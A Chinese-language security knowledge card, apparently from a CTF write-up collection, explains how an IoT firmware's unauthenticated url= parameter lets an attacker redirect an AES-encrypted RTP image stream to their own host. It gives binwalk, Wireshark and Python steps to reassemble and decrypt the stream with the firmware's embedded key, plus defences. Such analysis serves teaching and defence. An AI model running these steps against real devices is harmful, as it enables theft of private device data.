---
id: iot-protocol-firmware-push-api-rtp-aes-exfil-decrypt
title: 固件 Web 接口把推流目标 IP 交给用户控制：请求 url= 参数即让设备把加密图像经 RTP 推出，抓包剥 12 字节头后用固件里的 aes_key.bin 解密
type: scenario
domain: iot
path: iot/protocol
technique: firmware-push-target-ssrf-rtp-aes-stream-capture-decrypt
aliases:
- 固件推流目标可控
- url=ip& 参数劫持推流
- RTP 抓包还原加密图片
- aes_key.bin 解密推流
- 1036 字节分片 12 字节头
- IOT 固件数据外带
tags:
- iot
- firmware
- rtp
- aes
- traffic-analysis
- exfiltration
- wireshark
- ctf
cve: []
severity: medium
confidence: medium
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W7
  verified_at: '2026-11-09T01:55:16+08:00'
  notes: 已对照原文核对；本次核对未读取图片；binwalk 解包 babyrtp.bin 得 squashfs-root/usr 下的 aes_key.bin、handle_request→extract_url 以 url= 取值并以 & 结尾、push_stream 以 flag.jpg aes_key.bin <ip> 5004 调 rtp_aes_push、send_rtp_stream 每次读 1024 字节加密后经 RTP 发出、aes_encrypt 16 字节分组不足补齐、抓包每片 1036 字节（1024 密文 + 12 字节 RTP 头）丢弃前 12 字节再 AES-ECB 解密均与正文一致。未验证点：函数名与反汇编、Wireshark 过滤式与 output.bin 导出界面仅在截图；正文未标固件/组件版本，故未设 affected_versions；原文解密脚本含一处语法错误（多余的括号行），卡内 PoC 已重写为可读形态但未复跑。
---

## 一句话结论

固件里的 Web 服务把「推流目标」完全交给请求参数（`?url=<ipv4>&`），随后以该 IP 为接收端、5004 端口为目的地，把本地 `flag.jpg` 用 `aes_key.bin` 做 AES-ECB 加密后分片经 RTP 推出；攻击者只需把 IP 填成自己的地址，抓包后按「每片 1036 字节、前 12 字节是 RTP 头」切片拼接，再用从固件解包目录取出的密钥解密，即可拿到设备本想内部推送的图像。

## 原理

- **推流目标未受控**：`handle_request` → `extract_url` 只按 `url=` 取值并以 `&` 截断，得到 ipv4 后直接 `push_stream(ip)`，内部执行 `rtp_aes_push flag.jpg aes_key.bin <ip> 5004` 并常驻。目标地址没有任何白名单/鉴权/来源校验，因此攻击者指定的任意可达 IP 都能成为接收端。
- **加密不等于保密**：`rtp_aes_push` 用打包进固件的 `aes_key.bin` 作密钥、AES-ECB 每 16 字节分组加密，不足 16 字节补数字字符。密钥随固件分发（固件可被 binwalk 解包成 squashfs，密钥文件就在 `usr/` 下），所以只要能收到密文就能解密——加密只防「路上随手看」，不防「拿到固件的人」。
- **分片结构决定还原方式**：发送端一次读 1024 字节明文、加密后仍为 1024 字节，加上 RTP 头（固定 12 字节）后每片 1036 字节上线。抓到的 UDP 流按 1036 字节对齐切片，丢弃每片前 12 字节，把剩余 1024 字节顺序拼接即得到完整的 AES 密文文件。
- **为什么能出网**：题目环境里设备与攻击者处于同一 NAT 后的可路由网段，设备主动向攻击者 IP 发起 UDP/5004，方向是「设备 → 外」，不依赖外部入站，所以 NAT 场景下也能收到（抓包要抓 NAT 虚拟网卡）。
- 该链的根因是「用户可控的出站目标 + 明文可得的对称密钥」，与 SSRF 的判据一致，只是协议换成了 RTP。

## 触发条件

- 设备固件的 Web 服务暴露（本例 8080）且推流接口无需鉴权，`url=` 参数可指定任意 IPv4。
- 设备能路由到攻击者地址（同网段/可出网），UDP 5004 未被出口策略阻断。
- 攻击者能抓到该 UDP 流量（同网段嗅探、NAT 网关镜像、或让设备推到自己的监听端口）。
- 能获得固件镜像以取出 `aes_key.bin`（本例通过 binwalk 解包 `babyrtp.bin` 得到 squashfs）。

## 利用步骤

1. 固件解包：`binwalk -e babyrtp.bin` 得到 squashfs 根目录，确认 `usr/` 下有 `aes_key.bin`，以及推流二进制 `rtp_aes_push`。
2. 逆向确认接口与语义：`handle_request` 解析 `url=`、以 `&` 结束取值；`push_stream` 以 `flag.jpg aes_key.bin <ip> 5004` 调起推流；`send_rtp_stream` 每次读 1024 字节加密后通过 RTP 发出；`aes_encrypt` 为 16 字节分组。
3. 在自己主机上用 Wireshark 监听 UDP 5004（NAT 环境抓对应虚拟网卡），记下本机 IP。
4. 向设备发请求：`/path?url=<本机IP>&`，触发设备持续向本机推流。
5. 过滤 `rtp` 流量，跟踪 UDP 流、按原始数据另存为 `output.bin`。
6. 按 1036 字节切片、丢弃每片前 12 字节，拼接成 `images.bin`；用 `aes_key.bin` 以 AES-ECB 解密，去掉补齐字符即得原始 JPEG。

PoC（切片脚本，本地对已抓取文件执行）：

```python
with open("output.bin", "rb") as f:
    all_data = f.read()
pad = 1036 - len(all_data) % 1036
all_data += b"0" * pad
with open("images.bin", "wb") as f:
    for i in range(len(all_data) // 1036):
        f.write(all_data[i*1036:(i+1)*1036][12:])
```

```python
from Crypto.Cipher import AES
key = open("squashfs-root/usr/aes_key.bin", "rb").read()
cipher = AES.new(key, AES.MODE_ECB)
data = open("images.bin", "rb").read()
out = b"".join(cipher.decrypt(data[i:i+16]) for i in range(0, len(data), 16))
open("flag.jpg", "wb").write(out.rstrip(b"0"))
```

## 变体与关联

- **协议变体**：推流目标可控的接口不只 RTP，RTSP/RTMP/HTTP 上报、Syslog/SNMP trap 目标、MQTT broker 地址等「设备主动外连的用户可控地址」都是同一原语。
- **密钥来源变体**：密钥可硬编码在二进制里、放在 squashfs 配置文件中、或由设备序列号派生；只要固件可获取即视为可得。
- **抓包变体**：无法嗅探时让设备直接推到攻击者监听端口；或用中间人（ARP 欺骗）截获设备到原接收端的流量。
- **关联**：`iot-protocol-rtsp-osd-credential-leak-h264-capture`（RTP/RTSP 流侧的另一类信息泄露）、`web-generic-ssrf`（SSRF 判据）、`code-analysis-reverse-firmware`（binwalk 解包与固件结构）。

## 检测与防御

- **接口侧**：推流/上报目标必须服务端固定或走配置，不接受请求参数直接指定 IP；如必须可选，用白名单域名 + 出站 ACL。
- **凭据与密钥**：不要把同一把对称密钥烧进所有设备；改用设备唯一密钥 + 服务器证书校验，避免「拿到固件即解密全部流量」。
- **网络侧**：限制设备出站方向（只允许到管理平台/指定端口），对 UDP 5004 等媒体端口做目标地址校验；异常「设备向公网陌生 IP 发起媒体流」应告警。
- **固件侧**：接口加鉴权与 CSRF 保护，管理面禁止未授权访问；发布固件时剥离调试信息与明文密钥文件。
